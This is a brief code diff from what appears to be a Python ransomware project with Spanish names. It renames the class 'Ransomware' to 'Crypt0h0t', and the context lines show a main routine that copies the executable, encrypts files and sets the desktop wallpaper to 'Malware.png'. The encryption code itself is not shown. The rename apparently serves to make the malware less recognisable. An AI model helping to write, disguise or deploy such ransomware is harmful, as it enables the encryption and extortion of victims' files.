@@ -13,7 +13,7 @@ import base64
 import secure_delete
 from wallpaper import cambiarFondo
 
-class Ransomware:
+class Crypt0h0t:
     def __init__(self) -> None:
         self.password = ''
         self.archivos = []
@@ -69,7 +69,7 @@ class Ransomware:
             print( f'No jalo: {e}' )
 
 def main():
-    r = Ransomware()
+    r = Crypt0h0t()
     r.copiarExe()
     r.cifrarArchivos()
     cambiarFondo( 'Malware.png' )
